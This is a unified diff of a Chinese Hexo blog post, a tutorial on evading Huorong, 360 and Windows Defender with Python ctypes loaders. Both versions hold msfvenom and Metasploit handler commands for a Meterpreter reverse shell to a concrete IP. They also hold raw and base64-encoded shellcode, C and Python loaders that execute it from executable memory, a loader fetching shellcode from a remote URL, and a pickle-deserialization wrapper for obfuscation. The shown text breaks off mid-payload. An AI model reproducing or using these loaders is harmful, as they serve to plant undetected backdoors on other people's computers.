@@ -9,10 +9,8 @@
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48" />
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7" />
     <meta name="description" content="
-
-
 免杀对抗-免杀Ctypes-饶过Shellcode&amp;amp;火绒&amp;amp;360&amp;amp;Defenderpython语言中的ctypes模块是一个专门用来做免杀应用的模块
-一.加载器选择-ctypes-DLL引用&amp;amp;执行C代码">
+一.加载器选择-ctypes-DLL引用&amp;amp;执行C代码一般">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -70,9 +68,9 @@
         })();
     </script>
 
-<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Shmily的博客" type="application/atom+xml">
-
+<meta name="generator" content="Hexo 6.1.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Shmily的博客" type="application/atom+xml">
 </head>
 
 <body>
@@ -335,7 +333,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -490,14 +488,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    9 分
                 </div>
                 
                 
@@ -514,66 +512,193 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <blockquote>
-</blockquote>
-<ul>
-<li><h3 id="免杀对抗-免杀Ctypes-饶过Shellcode-amp-火绒-amp-360-amp-Defender"><a href="#免杀对抗-免杀Ctypes-饶过Shellcode-amp-火绒-amp-360-amp-Defender" class="headerlink" title="免杀对抗-免杀Ctypes-饶过Shellcode&amp;火绒&amp;360&amp;Defender"></a>免杀对抗-免杀Ctypes-饶过Shellcode&amp;火绒&amp;360&amp;Defender</h3><p>python语言中的ctypes模块是一个专门用来做免杀应用的模块</p>
+<h3 id="免杀对抗-免杀Ctypes-饶过Shellcode-amp-火绒-amp-360-amp-Defender"><a href="#免杀对抗-免杀Ctypes-饶过Shellcode-amp-火绒-amp-360-amp-Defender" class="headerlink" title="免杀对抗-免杀Ctypes-饶过Shellcode&amp;火绒&amp;360&amp;Defender"></a>免杀对抗-免杀Ctypes-饶过Shellcode&amp;火绒&amp;360&amp;Defender</h3><p>python语言中的ctypes模块是一个专门用来做免杀应用的模块</p>
 <h4 id="一-加载器选择-ctypes-DLL引用-amp-执行C代码"><a href="#一-加载器选择-ctypes-DLL引用-amp-执行C代码" class="headerlink" title="一.加载器选择-ctypes-DLL引用&amp;执行C代码"></a>一.加载器选择-ctypes-DLL引用&amp;执行C代码</h4><p>一般，我们生成的后门在实战中，上传上去都会被该肉鸡的杀毒软件给杀掉，所以免杀成为了我们必须掌握的知识之一。</p>
 <p>我们可以通过生成DLL文件，然后用到python的ctypes模块去执行该DLL文件的后门，就可以相对绕过一些杀毒软件，说到这里有些朋友肯定就问了，在实战中，不是每个服务器都有python环境的呀？在这里我们当然就是将python代码编译成exe文件上传上去执行啦（可以用到pythoninstall&amp;py2exe）</p>
-<p>```</p>
-</li>
-</ul>
-<p>pythoninstall.exe -F -w 对应的dll文件</p>
-<pre><code>
+<pre><code>pythoninstall.exe -F -w 对应的dll文件
 </code></pre>
-<p>应用DLL载入执行：(载入DLL进行DLL代码函数调用执行)</p>
-<p>C++:</p>
-<p>extern “C” _declspec(dllexport) void TestCtypes() {</p>
-<p>​    printf(“I like eating watermelon\n”);</p>
-<p>  }</p>
-<p>  Python：</p>
-<p>  from ctypes import *</p>
-<p>#加载dll2.dll</p>
-<p>lib=CDLL(‘dll2’)</p>
-<p>#调用当前库方法</p>
-<p>lib.TestCtypes()</p>
-<pre><code>
-#### 打包器选择-C语言编译-MSF-C-电脑管家
-</code></pre>
-<p>1、管家各种过-火绒 defender查杀<br>  msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6688 -f c<br>use exploit/multi/handler<br>  set payload windows/meterpreter/reverse_tcp<br>set lhost 0.0.0.0<br>  set lport 6688<br>run<br>  VS创建项目，添加C语言文件，添加执行代码并替换Shellcode，编译生成<br>#include &lt;Windows.h&gt;<br>  #include &lt;stdio.h&gt;<br>#include &lt;string.h&gt;</p>
-<p>#pragma comment(linker,”/subsystem:"Windows" /entry:"mainCRTStartup"“) //windows控制台程序不出黑窗口</p>
-<p>  unsigned char buf[] =<br>  “\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30”<br>  “\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff”<br>  “\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49”<br>  “\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78”<br>  “\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3”<br>  “\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1”<br>  “\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24”<br>  “\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c”<br>  “\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59”<br>  “\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d”<br>  “\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26”<br>  “\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68”<br>  “\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x2f\x5e\xec\x75\x68\x02”<br>  “\x00\x1a\x20\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea”<br>  “\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61”<br>  “\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00”<br>  “\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83”<br>  “\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a”<br>  “\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57”<br>  “\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00”<br>  “\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68”<br>  “\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff”<br>  “\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb”<br>  “\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5”;</p>
-<p>  main()</p>
-<p>  {<br>      char* Memory;</p>
-<pre><code>  Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+<pre><code>应用DLL载入执行：(载入DLL进行DLL代码函数调用执行)
 
-  memcpy(Memory, buf, sizeof(buf));
+C++:
 
-  ((void(*)())Memory)();
-</code></pre>
-<p>  }</p>
-<pre><code>
-#### 加密器选择-Python编译-MSF-C-bs64-Defender
+extern "C" _declspec(dllexport) void TestCtypes() {
 
-利用思路：将Payload进行编码生成，Python解码后调用执行绕过。
+​    printf("I like eating watermelon\n");
+
+}
+
+
+
+Python：
+
+from ctypes import *
+
+
+
+\#加载dll2.dll
+
+lib=CDLL('dll2')
+
+\#调用当前库方法
+
+lib.TestCtypes()
 </code></pre>
-<p>pyinstaller打包-defender<br>  msfvenom -p windows/meterpreter/reverse_tcp –encrypt base64 lhost=ip lport=port -f c<br>Pycharm调用Ctypes模块解码调用C<br>  pyinstaller.exe -F -w ms-py.py</p>
-<p>  import ctypes<br>import base64</p>
-<p>encode_shellcode = ‘’’\x2f\x4f\x69\x50\x41\x41\x41\x41\x59\x44\x48\x53\x5a\x49\x74<br>  \x53\x4d\x49\x74\x53\x44\x49\x74\x53\x46\x49\x6e\x6c\x69\x33<br>\x49\x6f\x44\x37\x64\x4b\x4a\x6a\x48\x2f\x4d\x63\x43\x73\x50<br>  \x47\x46\x38\x41\x69\x77\x67\x77\x63\x38\x4e\x41\x63\x64\x4a<br>\x64\x65\x39\x53\x56\x34\x74\x53\x45\x49\x74\x43\x50\x41\x48<br>  \x51\x69\x30\x42\x34\x68\x63\x42\x30\x54\x41\x48\x51\x69\x31<br>\x67\x67\x41\x64\x4f\x4c\x53\x42\x68\x51\x68\x63\x6c\x30\x50<br>  \x45\x6d\x4c\x4e\x49\x73\x42\x31\x6a\x48\x2f\x4d\x63\x43\x73<br>\x77\x63\x38\x4e\x41\x63\x63\x34\x34\x48\x58\x30\x41\x33\x33<br>  \x34\x4f\x33\x30\x6b\x64\x65\x42\x59\x69\x31\x67\x6b\x41\x64<br>\x4e\x6d\x69\x77\x78\x4c\x69\x31\x67\x63\x41\x64\x4f\x4c\x42<br>  \x49\x73\x42\x30\x49\x6c\x45\x4a\x43\x52\x62\x57\x32\x46\x5a<br>\x57\x6c\x48\x2f\x34\x46\x68\x66\x57\x6f\x73\x53\x36\x59\x44<br>  \x2f\x2f\x2f\x39\x64\x61\x44\x4d\x79\x41\x41\x42\x6f\x64\x33<br>\x4d\x79\x58\x31\x52\x6f\x54\x48\x63\x6d\x42\x34\x6e\x6f\x2f<br>  \x39\x43\x34\x6b\x41\x45\x41\x41\x43\x6e\x45\x56\x46\x42\x6f<br>\x4b\x59\x42\x72\x41\x50\x2f\x56\x61\x67\x70\x6f\x4c\x31\x37<br>  \x73\x64\x57\x67\x43\x41\x42\x6f\x67\x69\x65\x5a\x51\x55\x46<br>\x42\x51\x51\x46\x42\x41\x55\x47\x6a\x71\x44\x39\x2f\x67\x2f<br>  \x39\x57\x58\x61\x68\x42\x57\x56\x32\x69\x5a\x70\x58\x52\x68<br>\x2f\x39\x57\x46\x77\x48\x51\x4b\x2f\x30\x34\x49\x64\x65\x7a<br>  \x6f\x5a\x77\x41\x41\x41\x47\x6f\x41\x61\x67\x52\x57\x56\x32<br>\x67\x43\x32\x63\x68\x66\x2f\x39\x57\x44\x2b\x41\x42\x2b\x4e<br>  \x6f\x73\x32\x61\x6b\x42\x6f\x41\x42\x41\x41\x41\x46\x5a\x71<br>\x41\x47\x68\x59\x70\x46\x50\x6c\x2f\x39\x57\x54\x55\x32\x6f<br>  \x41\x56\x6c\x4e\x58\x61\x41\x4c\x5a\x79\x46\x2f\x2f\x31\x59<br>\x50\x34\x41\x48\x30\x6f\x57\x47\x67\x41\x51\x41\x41\x41\x61<br>  \x67\x42\x51\x61\x41\x73\x76\x44\x7a\x44\x2f\x31\x56\x64\x6f<br>\x64\x57\x35\x4e\x59\x66\x2f\x56\x58\x6c\x37\x2f\x44\x43\x51<br>  \x50\x68\x58\x44\x2f\x2f\x2f\x2f\x70\x6d\x2f\x2f\x2f\x2f\x77<br>\x48\x44\x4b\x63\x5a\x31\x77\x63\x4f\x37\x38\x4c\x57\x69\x56<br>  \x6d\x6f\x41\x55\x2f\x2f\x56<br>‘’’</p>
-<p>shellcode = base64.b64decode(encode_shellcode)<br>  #print(shellcode)</p>
-<p>  rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)<br>ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))<br>  handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)<br>ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</p>
-<pre><code>  
-#### 加密器选择-Python编译-MSF-C-无Payload-火绒
-  
-利用思路：将Payload存放互联网资源上，通过爬虫获取后再进行编码，后续通过定位特征码形式找到关键代码查杀块，继续编码绕过。
-  
-</code></pre>
-<p>pyinstaller打包-defender<br>  msfvenom -p windows/meterpreter/reverse_tcp –encrypt base64 lhost=ip lport=port -f c<br>Pycharm调用Ctypes模块解码调用C<br>  pyinstaller.exe -F -w ms-py-2.py</p>
-<p>  import ctypes<br>import requests<br>  import base64</p>
-<p>  encode_shellcode = requests.get(“<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/123.txt&quot;).text">http://www.xiaodi8.com/123.txt").text</a><br>shellcode = base64.b64decode(encode_shellcode)<br>  #print(shellcode)</p>
-<p>  rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)<br>  func=base64.b64decode(b’Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSk=’)<br>  exec(func)<br>  handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)<br>  ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</p>
-<pre><code>
+<h4 id="打包器选择-C语言编译-MSF-C-电脑管家"><a href="#打包器选择-C语言编译-MSF-C-电脑管家" class="headerlink" title="打包器选择-C语言编译-MSF-C-电脑管家"></a>打包器选择-C语言编译-MSF-C-电脑管家</h4><pre><code>1、管家各种过-火绒 defender查杀
+msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6688 -f c
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 6688
+run
+VS创建项目，添加C语言文件，添加执行代码并替换Shellcode，编译生成
+#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口
+
+unsigned char buf[] =
+"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
+"\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
+"\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3"
+"\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1"
+"\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24"
+"\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
+"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59"
+"\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d"
+"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
+"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
+"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x2f\x5e\xec\x75\x68\x02"
+"\x00\x1a\x20\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
+"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
+"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
+"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
+"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
+"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
+"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
+"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
+"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
+"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb"
+"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
+
+main()
+
+{
+    char* Memory;
+
+    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    memcpy(Memory, buf, sizeof(buf));
+
+    ((void(*)())Memory)();
+
+}
 
 </code></pre>
+<h4 id="加密器选择-Python编译-MSF-C-bs64-Defender"><a href="#加密器选择-Python编译-MSF-C-bs64-Defender" class="headerlink" title="加密器选择-Python编译-MSF-C-bs64-Defender"></a>加密器选择-Python编译-MSF-C-bs64-Defender</h4><pre><code>利用思路：将Payload进行编码生成，Python解码后调用执行绕过。
+pyinstaller打包-defender
+msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 lhost=ip lport=port -f c
+Pycharm调用Ctypes模块解码调用C
+pyinstaller.exe -F -w ms-py.py
+
+import ctypes
+import base64
+
+encode_shellcode = '''\x2f\x4f\x69\x50\x41\x41\x41\x41\x59\x44\x48\x53\x5a\x49\x74
+\x53\x4d\x49\x74\x53\x44\x49\x74\x53\x46\x49\x6e\x6c\x69\x33
+\x49\x6f\x44\x37\x64\x4b\x4a\x6a\x48\x2f\x4d\x63\x43\x73\x50
+\x47\x46\x38\x41\x69\x77\x67\x77\x63\x38\x4e\x41\x63\x64\x4a
+\x64\x65\x39\x53\x56\x34\x74\x53\x45\x49\x74\x43\x50\x41\x48
+\x51\x69\x30\x42\x34\x68\x63\x42\x30\x54\x41\x48\x51\x69\x31
+\x67\x67\x41\x64\x4f\x4c\x53\x42\x68\x51\x68\x63\x6c\x30\x50
+\x45\x6d\x4c\x4e\x49\x73\x42\x31\x6a\x48\x2f\x4d\x63\x43\x73
+\x77\x63\x38\x4e\x41\x63\x63\x34\x34\x48\x58\x30\x41\x33\x33
+\x34\x4f\x33\x30\x6b\x64\x65\x42\x59\x69\x31\x67\x6b\x41\x64
+\x4e\x6d\x69\x77\x78\x4c\x69\x31\x67\x63\x41\x64\x4f\x4c\x42
+\x49\x73\x42\x30\x49\x6c\x45\x4a\x43\x52\x62\x57\x32\x46\x5a
+\x57\x6c\x48\x2f\x34\x46\x68\x66\x57\x6f\x73\x53\x36\x59\x44
+\x2f\x2f\x2f\x39\x64\x61\x44\x4d\x79\x41\x41\x42\x6f\x64\x33
+\x4d\x79\x58\x31\x52\x6f\x54\x48\x63\x6d\x42\x34\x6e\x6f\x2f
+\x39\x43\x34\x6b\x41\x45\x41\x41\x43\x6e\x45\x56\x46\x42\x6f
+\x4b\x59\x42\x72\x41\x50\x2f\x56\x61\x67\x70\x6f\x4c\x31\x37
+\x73\x64\x57\x67\x43\x41\x42\x6f\x67\x69\x65\x5a\x51\x55\x46
+\x42\x51\x51\x46\x42\x41\x55\x47\x6a\x71\x44\x39\x2f\x67\x2f
+\x39\x57\x58\x61\x68\x42\x57\x56\x32\x69\x5a\x70\x58\x52\x68
+\x2f\x39\x57\x46\x77\x48\x51\x4b\x2f\x30\x34\x49\x64\x65\x7a
+\x6f\x5a\x77\x41\x41\x41\x47\x6f\x41\x61\x67\x52\x57\x56\x32
+\x67\x43\x32\x63\x68\x66\x2f\x39\x57\x44\x2b\x41\x42\x2b\x4e
+\x6f\x73\x32\x61\x6b\x42\x6f\x41\x42\x41\x41\x41\x46\x5a\x71
+\x41\x47\x68\x59\x70\x46\x50\x6c\x2f\x39\x57\x54\x55\x32\x6f
+\x41\x56\x6c\x4e\x58\x61\x41\x4c\x5a\x79\x46\x2f\x2f\x31\x59
+\x50\x34\x41\x48\x30\x6f\x57\x47\x67\x41\x51\x41\x41\x41\x61
+\x67\x42\x51\x61\x41\x73\x76\x44\x7a\x44\x2f\x31\x56\x64\x6f
+\x64\x57\x35\x4e\x59\x66\x2f\x56\x58\x6c\x37\x2f\x44\x43\x51
+\x50\x68\x58\x44\x2f\x2f\x2f\x2f\x70\x6d\x2f\x2f\x2f\x2f\x77
+\x48\x44\x4b\x63\x5a\x31\x77\x63\x4f\x37\x38\x4c\x57\x69\x56
+\x6d\x6f\x41\x55\x2f\x2f\x56
+'''
+
+shellcode = base64.b64decode(encode_shellcode)
+#print(shellcode)
+
+rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
+ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))
+handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
+ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
+</code></pre>
+<h4 id="加密器选择-Python编译-MSF-C-无Payload-火绒"><a href="#加密器选择-Python编译-MSF-C-无Payload-火绒" class="headerlink" title="加密器选择-Python编译-MSF-C-无Payload-火绒"></a>加密器选择-Python编译-MSF-C-无Payload-火绒</h4><pre><code>利用思路：将Payload存放互联网资源上，通过爬虫获取后再进行编码，后续通过定位特征码形式找到关键代码查杀块，继续编码绕过。
+pyinstaller打包-defender
+msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 lhost=ip lport=port -f c
+Pycharm调用Ctypes模块解码调用C
+pyinstaller.exe -F -w ms-py-2.py
+
+import ctypes
+import requests
+import base64
+
+encode_shellcode = requests.get("http://www.xiaodi8.com/123.txt").text
+shellcode = base64.b64decode(encode_shellcode)
+#print(shellcode)
+
+rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
+func=base64.b64decode(b'Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSk=')
+exec(func)
+handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
+ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
+</code></pre>
+<h4 id="反序列化-Python免杀"><a href="#反序列化-Python免杀" class="headerlink" title="反序列化-Python免杀"></a>反序列化-Python免杀</h4><pre><code>先将执行上线的python代码进行序列化操作，
+import pickle
+import base64
+
+shellcode = '''
+import ctypes,base64
+encode_shellcode=b'/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//VMf9XV1dXV2g6Vnmn/9XphAAAAFsxyVFRagNRUWi4IgAAU1BoV4mfxv/V63BbMdJSaAACQIRSUlJTUlBo61UuO//VicaDw1Ax/1dXav9TVmgtBhh7/9WFwA+EwwEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3S3Mf/pkQEAAOnJAQAA6Iv///8veUlTRwCSVUrnb06Tl/bbisKMif4lfZ9slXUVr5+cG5srC1T4fLW65ks/DDOz82IafOBOwJclbGdnr4yhiNHQxphjbROB8peI7VY/1VtdAFVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzUuMDsgTlAwODsgTUFBVTsgTlAwOCkNCgBt36bQMfc4U/WYbkyJcY+0LDn9Vwa9+UfZFcWSSn4OoSbEyXDdmOzbxpVKbstDjE62F9LnMUbgkwk5/Oex9Kjw8XALC3Hinx1aL1fhXt852VZaBp48ZLcI7faeJXJs7pIGde/8ErflpenoUHqx5Sf5c8ITZmw+oIqcilHK9DW4b7D8yX/HV2/Bzys58o1bzaYUhaLAPGxd/FX6qvcFrEh2nLpRFO18cgGBa8oTXlUJkAd78ifATC9YQzwHg/jlXBq2aJPkUfxRaABo8LWiVv/VakBoABAAAGgAAEAAV2hYpFPl/9WTuQAAAAAB2VFTiedXaAAgAABTVmgSloni/9WFwHTGiwcBw4XAdeVYw+ip/f//NDcuOTQuMjM2LjExNwAAAYag'
+shellcode = base64.b64decode(encode_shellcode)
+rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
+ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))
+handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
+ctypes.windll.kernel32.WaitForSingleObject(handle, -1)'''
+
+
+class A(object):
+    def __reduce__(self):
+        return (exec, (shellcode,))  #exec ：执行shellcode中的代码
+
+
+ret = pickle.dumps(A())  #将A方法 序列化
+ret_base64 = base64.b64encode(ret)
+print(ret_base64) #得到序列化加密后的代码
+
+
+
+然后将序列化加密后的代码 反序列化 并调用执行即可，可做到一定的免杀效果
+import base64,pickle,ctypes
+shellcode=b'gANjYnVpbHRpbnMKZXhlYwpxAFiyBQAACmltcG9ydCBjdHlwZXMsYmFzZTY0CmVuY29kZV9zaGVsbGNvZGU9YicvT2lKQUFBQVlJbmxNZEpraTFJd2kxSU1pMUlVaTNJb0Q3ZEtKakgvTWNDc1BHRjhBaXdnd2M4TkFjZmk4RkpYaTFJUWkwSThBZENMUUhpRndIUktBZEJRaTBnWWkxZ2dBZFBqUEVtTE5Jc0IxakgvTWNDc3djOE5BY2M0NEhYMEEzMzRPMzBrZGVKWWkxZ2tBZE5taXd4TGkxZ2NBZE9MQklzQjBJbEVKQ1JiVzJGWldsSC80RmhmV29zUzY0WmRhRzVsZEFCb2QybHVhVlJvVEhjbUIvL1ZNZjlYVjFkWFYyZzZWbm1uLzlYcGhBQUFBRnN4eVZGUmFnTlJVV2k0SWdBQVUxQm9WNG1meHYvVjYzQmJNZEpTYUFBQ1FJUlNVbEpUVWxCbzYxVXVPLy9WaWNhRHcxQXgvMWRYYXY5VFZtZ3RCaGg3LzlXRndBK0V3d0VBQURIL2hmWjBCSW41Nndsb3FzWGlYZi9WaWNGb1JTRmVNZi9WTWY5WGFnZFJWbEJvdDFmZ0MvL1Z2d0F2QUFBNXgzUzNNZi9wa1FFQUFPbkpBUUFBNkl2Ly8vOHZlVWxUUndDU1ZVcm5iMDZUbC9iYmlzS01pZjRsZlo5c2xYVVZyNStjRzVzckMxVDRmTFc2NWtzL0RET3o4MklhZk9CT3dKY2xiR2RucjR5aGlOSFF4cGhqYlJPQjhwZUk3VlkvMVZ0ZEFGVnpaWEl0UVdkbGJuUTZJRTF2ZW1sc2JHRXZOUzR3SUNoamIyMXdZWFJwWW14bE95Qk5VMGxGSURrdU1Ec2dWMmx1Wkc5M2N5Qk9WQ0EyTGpFN0lGZFBWelkwT3lCVWNtbGtaVzUwTHpVdU1Ec2dUbEF3T0RzZ1RVRkJWVHNnVGxBd09Da05DZ0J0MzZiUU1mYzRVL1dZYmt5SmNZKzBMRG45VndhOStVZlpGY1dTU240T29TYkV5WERkbU96YnhwVktic3REakU2MkY5TG5NVWJna3drNS9PZXg5S2p3OFhBTEMzSGlueDFhTDFmaFh0ODUyVlphQnA0OFpMY0k3ZmFlSlhKczdwSUdkZS84RXJmbHBlbm9VSHF4NVNmNWM4SVRabXcrb0lxY2lsSEs5RFc0YjdEOHlYL0hWMi9CenlzNThvMWJ6YVlVaGFMQVBHeGQvRlg2cXZjRnJFaDJuTHBSRk8xOGNnR0JhOG9UWGxVSmtBZDc4aWZBVEM5WVF6d0hnL2psWEJxMmFKUGtVZnhSYUFCbzhMV2lWdi9WYWtCb0FCQUFBR2dBQUVBQVYyaFlwRlBsLzlXVHVRQUFBQUFCMlZGVGllZFhhQUFnQUFCVFZtZ1Nsb25pLzlXRndIVEdpd2NCdzRYQWRlVll3K2lwL2YvL05EY3VPVFF1TWpNMkxqRXhOd0FBQVlhZycKc2hlbGxjb2RlID0gYmFzZTY0LmI2NGRlY29kZShlbmNvZGVfc2hlbGxjb2RlKQpyd3hwYWdlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCwgbGVu